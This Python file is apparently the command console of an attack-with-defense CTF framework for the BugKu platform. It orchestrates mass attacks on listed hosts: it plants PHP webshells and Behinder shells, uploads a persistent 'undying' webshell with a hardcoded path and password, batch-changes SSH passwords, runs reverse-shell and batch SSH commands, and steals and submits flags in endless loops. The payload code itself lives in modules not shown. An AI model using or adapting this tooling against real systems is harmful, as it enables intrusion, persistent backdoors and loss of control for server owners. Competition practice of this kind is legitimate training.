# coding=utf-8
from cmd import Cmd
from config.MemShellConfig import *
from code.AutoAck import *
from code.MemShell import *
import os
class YmlConsole(Cmd):
    prompt = "YML-FOR-BugKu-> "
    Object = None

    def __init__(self):
        Cmd.__init__(self)

    def preloop(self):
        string = """
            ##########YML-AWD-Farmwork-FOR-BugKu-V3.0#################
                                           Powered By yemoli
                                           Date:2021-04-11   
            1.BugKu新版IP添加只需指定前缀ip与端口即可，如192-168-1-X.awd.bugku.cn可使用如下命令
              addip 192.168.0.1-255 80  
            2.存活探测在test.py     
                                             
               """
        self.commandHelp = """
                Command Tips
                =============

                Command          Tips
                -------       -----------
                init          初始化(清空靶机ip列表)
                addip         添加靶机 ip和端口
                removeip      移除某个ip
                showip        查看ip列表 
                addssh        添加ssh信息
                showssh       查看ssh列表
                removessh     移除某个ssh
                passh         更改ssh密码 
                autopassh     循环修改ssh密码
                sshcmd        批量执行预设的ssh命令
                recvcmd       反弹shell(recv)命令执行
                autorecvflag  通过recvshell自动拿flag并提交
                getflag       根据webreq获取一次flag
                showflag      查看已获取的flag
                submitflag    提交一次数据库中的flag
                autoreqflag   webreq自动获取flag并提交
                setshell      设置一句话木马(php)
                showshell     查看存储的一句话木马
                getmell       获取不死马,执行反弹shell命令(php)
                setbehind     设置冰蝎木马(php)
                cmdbehind     利用冰蝎批量执行命令
                showbehind    查看存储的冰蝎木马
                rmsoftLink    删除现有的软链接
                exit          退出
                                """
        printRed(string)
        printGreen(self.commandHelp)

    def help_addip(self):
        printGreen("例如输入:addip 10.10.11-22.10 80-90")
        printGreen("addip [ip段] [端口段]")
    def help_showip(self):
        printGreen("查看已录入的ip")
    def help_removeip(self):
        printGreen("例如输入:removeip 127.0.0.1-10 10-20")
        printGreen("remove [ip段] [端口段]")
    def help_setshell(self):
        printGreen("""[demo]:setshell 39.105.92.157 8801-8810 assets/scripts/pass.php 123456 post""")
    def help_setbehind(self):
        printGreen("""[demo]:setbehind 39.105.92.157 8801-8810 assets/scripts/shell.php 123456""")
    def help_addssh(self):
        printGreen("例如输入:addssh 10.10.11-22.10 80-90")
        printGreen("addssh [ip段] [端口段]")
    def help_removessh(self):
        printGreen("例如输入:removessh 127.0.0.1 22")
        printGreen("remove [ip] [端口]")
    def do_addssh(self,argv):
        init_ssh()
        ip = argv.split(' ')
        if len(ip) != 2:
            printYellow("==============================")
            printRed("[-]输入有误!!!")
            printYellow("==============================")
            self.help_addssh()
        else:
            ip_l = get_ip_list(ip[0])
            port_l = get_port_list(ip[1])
            try:
                if save_ssh(ip_l, port_l):
                    printGreen("[+]SSH信息录入成功")
                else:
                    printRed("[-]SSH信息录入失败")
            except:
                printRed("[-]执行过程遇到错误，错误代码:1010")
    def do_showssh(self,argv):
        count = 0
        result = select_ssh()
        printYellow("*****SSH-LIST*****")
        printYellow("*****************")
        for row in result:
            printGreen(row[0])
            count = 1
        if count == 0:
            printRed("[-]您暂未设置SSH信息")
        printYellow("*****************")

    def do_addip(self,argv):
        ip = argv.split(' ')
        if len(ip) != 2:
            printYellow("==============================")
            printRed("[-]输入有误!!!")
            printYellow("==============================")
            self.help_addip()
        else:
            ip_l = get_ip_list(ip[0])
            port_l = get_port_list(ip[1])
            try:
                save_address(ip_l,port_l)
                # sql="""insert into ipList (ip)values('10.0.1.1:82'),('10.0.1.2:82'),('10.0.1.3:82'),('10.0.1.4:82'),('10.0.1.5:82'),('10.0.1.6:82'),('10.0.1.7:82'),('10.0.1.8:82'),('10.0.1.9:82'),('10.0.1.10:82');"""
                printGreen("[+]ip地址录入成功")
            except:
                printRed("[-]执行过程遇到错误，错误代码:1001")
    def do_removeip(self,argv):
        ip = argv.split(' ')
        if len(ip) != 2:
            printYellow("==============================")
            printRed("[-]输入有误!!!")
            printYellow("==============================")
            self.help_removeip()
        else:
            ip_l = get_ip_list(ip[0])
            port_l = get_port_list(ip[1])
            try:
                remove_address(ip_l,port_l)
                # sql="""insert into ipList (ip)values('10.0.1.1:82'),('10.0.1.2:82'),('10.0.1.3:82'),('10.0.1.4:82'),('10.0.1.5:82'),('10.0.1.6:82'),('10.0.1.7:82'),('10.0.1.8:82'),('10.0.1.9:82'),('10.0.1.10:82');"""
                printGreen("[+]ip地址删除成功")
            except:
                printRed("[-]执行过程遇到错误，错误代码:1002")

    def do_removessh(self,argv):
        ip = argv.split(' ')
        if len(ip) != 2:
            printYellow("==============================")
            printRed("[-]输入有误!!!")
            printYellow("==============================")
            self.help_removessh()
        else:
            ip_l = get_ip_list(ip[0])
            port_l = get_port_list(ip[1])
            try:
                remove_ssh(ip_l, port_l)
                # sql="""insert into ipList (ip)values('10.0.1.1:82'),('10.0.1.2:82'),('10.0.1.3:82'),('10.0.1.4:82'),('10.0.1.5:82'),('10.0.1.6:82'),('10.0.1.7:82'),('10.0.1.8:82'),('10.0.1.9:82'),('10.0.1.10:82');"""
                printGreen("[+]SSH地址删除成功")
            except:
                printRed("[-]执行过程遇到错误，错误代码:1012")

    def do_showip(self,argv):
        count = 0
        result = select_ip()
        printYellow("*****IP-LIST*****")
        printYellow("*****************")
        for row in result:
            printGreen(row[0])
            count=1
        if count == 0:
            printRed("[-]您暂未设置ip")
        printYellow("*****************")

    def do_exit(self, argv):
        printGreen("See You Next Time!!!!")
        return True

    def Error(self, info):
        print(info)
        return

    def do_init(self,argv):
        try:
            yml_init()
            printGreen("[+]初始化成功")
        except:
            printRed("[-]初始化失败")

    def do_getflag(self,argv):
        try:
            init_flag()
            f = open('flag.txt', 'w+', encoding='utf8')
            f.write("")
            f.close()
            attack = Attack()
            attack.attack(func=payload)
            time.sleep(5)
        except:
            printRed("[-]执行过程遇到错误，错误代码:1003")

    def do_showflag(self,argv):
        count = 0
        result = select_flag()
        printYellow("*************************FLAG-LIST*****************************")
        printYellow("***************************************************************")
        for row in result:
            printGreen(f"{row[0]}->{row[1]}")
            count = 1
        if count == 0:
            printRed("[-]暂无flag")
        printYellow("***************************************************************")
    def do_submitflag(self,argv):
        try:
            attack=Attack()
            attack.trans_flag(func=reqFlagServer)
            time.sleep(5)
        except:
            printRed("[-]执行过程遇到错误，错误代码:1004")

    def do_autoreqflag(self,argv):
        try:
            while(1):
                auto_reqgetflag()
                progress_test(3)
                auto_submitflag()
                progress_test()

        except:
            print('[-]执行过程遇到错误，错误代码:1005')

    def do_autorecvflag(self,argv):
        try:
            while (1):
                auto_recvgetflag()
                progress_test(3)
                auto_submitflag()
                progress_test()
            # while(1):
        except:
            pass
    def do_autopassh(self,argv):
        try:
            while(1):
                printGreen("=============================")
                attack = Attack("ssh")
                attack.ack_ssh(func=passh)
                time.sleep(1)
        except:
            printRed("[-]执行过程遇到错误，错误代码:1017")
    def do_autosolkflag(self,argv):
        try:
            while(1):
                init_flag()
                f = open('flag.txt', 'w+', encoding='utf8')
                f.write("")
                f.close()
                attack = Attack("softlink")
                attack.ack_softLink(func=auto_solkflag)
                time.sleep(2)
                progress_test(3)
                auto_submitflag()
                progress_test()
        except:
            printRed("[-]执行过程遇到错误，错误代码:1019")
    def do_setshell(self,argv):

        cmds = argv.split(' ')
        if len(cmds) != 5:
            printYellow("==============================")
            printRed("[-]输入有误!!!")
            printYellow("==============================")
            self.help_setshell()
        else:
            ip = cmds[0]
            port = cmds[1]
            path = cmds[2]
            passwd = cmds[3]
            method = cmds[4]
            try:
                setWebShell(ip,port,path,passwd,method)
                # sql="""insert into ipList (ip)values('10.0.1.1:82'),('10.0.1.2:82'),('10.0.1.3:82'),('10.0.1.4:82'),('10.0.1.5:82'),('10.0.1.6:82'),('10.0.1.7:82'),('10.0.1.8:82'),('10.0.1.9:82'),('10.0.1.10:82');"""
                printGreen("[+]WebShell录入成功,可尝试使用getmell获取不死马")
            except:
                printRed("[-]执行过程遇到错误，错误代码:1008")
    def do_setbehind(self,argv):
        cmds = argv.split(' ')
        if len(cmds) != 4:
            printYellow("==============================")
            printRed("[-]输入有误!!!")
            printYellow("==============================")
            self.help_setbehind()
        else:
            ip = cmds[0]
            port = cmds[1]
            path = cmds[2]
            passwd = cmds[3]
            try:
                setBehinder(ip,port,path,passwd)
                printGreen("[+]Behinder录入成功,可尝试使用cmdbehind执行命令")
            except:
                printRed("[-]执行过程遇到错误，错误代码:1017")
    def do_getmell(self,argv):
        try:
            # if SoftLink == True:
            #     init_softLink()
            attack=Attack()
            attack.ack_memshell(func=upMemShell)
            printYellow("[++]不死马地址:http://xxx/.yml.php?pass=y7m01i 密码awd")
        except:
            printRed("[-]执行过程遇到错误，错误代码:1009")
    def do_showshell(self,argv):
        count = 0
        result = select_shell()
        printYellow("*************************SHELL-LIST*****************************")
        printYellow("***************************************************************")
        for row in result:
            printGreen(f"{row[1]}   {row[2]}   {row[3]}")
            count = 1
        if count == 0:
            printRed("[-]暂无shell")
        printYellow("***************************************************************")
    def do_showbehind(self,argv):
        count = 0
        result = select_behinder()
        printYellow("*************************Behind-List*****************************")
        printYellow("*****************************************************************")
        for row in result:
            printGreen(f"{row[1]}   {row[2]}")
            count = 1
        if count == 0:
            printRed("[-]暂无Behind")
        printYellow("*****************************************************************")

    def do_passh(self,argv):
        try:
            attack = Attack("ssh")
            attack.ack_ssh(func=passh)
        except:
            printRed("[-]执行过程遇到错误，错误代码:1011")
    def do_sshcmd(self,argv):
        try:
            attack = Attack("ssh")
            attack.ack_ssh(func=ssh_cmd)
        except:
            printRed("[-]执行过程遇到错误，错误代码:1012")
    def do_recvcmd(self,argv):
        try:
            exec_recvcmd()
        except:
            printRed("[-]执行过程遇到错误，错误代码:1013")
    def do_cmdbehind(self,argv):
        try:
            # if SoftLink == True:
            #     init_softLink()
            attack = Attack('behinder')
            attack.ack_behinder(func=cmdBehinder)
            printGreen("=====================================")
        except:
            printRed("[-]执行过程遇到错误，错误代码:1017")
    def do_rmsoftLink(self,argv):
        try:
            init_softLink()
            printGreen("[+]删除成功")
        except:
            printRed("[-]删除失败!")
    def complete_yemoli(self, text, *ignored):
        pass


if __name__ == '__main__':
    yml = YmlConsole()
    # yml.cmdloop()
    try:
        os.system('clear')
        yml.cmdloop()
    except:
        exit()